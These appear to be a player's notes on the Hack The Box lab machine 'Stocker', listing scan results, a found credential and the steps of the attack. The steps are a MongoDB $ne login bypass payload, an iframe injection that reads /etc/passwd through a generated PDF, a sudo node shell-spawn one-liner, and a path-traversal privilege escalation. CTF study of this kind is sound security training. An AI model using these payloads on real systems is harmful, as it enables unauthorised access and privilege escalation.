| HOST                       | PORT | PROTO | SERVICE | VERSION                 |
| -------------------------- | ---- | ----- | ------- | ----------------------- |
| 10.10.11.196 (stocker.htb) | 22   | tcp   | OpenSSH | 8.2p1 Ubuntu 4ubuntu0.5 |
| 10.10.11.196 (stocker.htb) | 80   | tcp   | nginx   | 1.18.0                  |


## HEADERS
---
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 24 Jun 2023 18:54:56 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://stocker.htb

---

## DIRECTORIES
---
/login (dev.stocker.htb)

---

## USERS
---
angoose : IHeardPassphrasesArePrettySecure

---

## NOTES
---
* static website
* Found: dev.stocker.htb Status: 302 [Size: 28] /login with gobuster vhost and the --append-domain flag
* connect.sid (often note.js)
* change object to JSON, node will most likely accept JSON

* can use the MongoDB $ne operator as a "not equal to" equivalent in SQL to inject and bypass the login portal
```json
{"username":{
"$ne": "wither"
},
"password":{
"$ne": "wither"
}
}
```

* html iframe injection in the purchase request allows for rfi
```json
{"basket":[{"_id":"638f116eeb060210cbd83a93","title":"Toilet Paper<iframe src='file:///etc/passwd' height='1000' width='1000'","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0,"amount":1}]}
```

/api/po/id for vulnerable pdf

`angoose` has /bin/bash

site uses nginx, default configuration at ``/etc/nginx/sites-enabled/default`

mongodb config in /var/www/dev/index.js and contains a password `IHeardPassphrasesArePrettySecure`

`(ALL) /usr/bin/node /usr/local/scripts/*.js` sudo -l

gtfobin
```
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

final exploit `sudo /usr/bin/node /usr/local/scripts/../../../tmp/exploit.js`


---
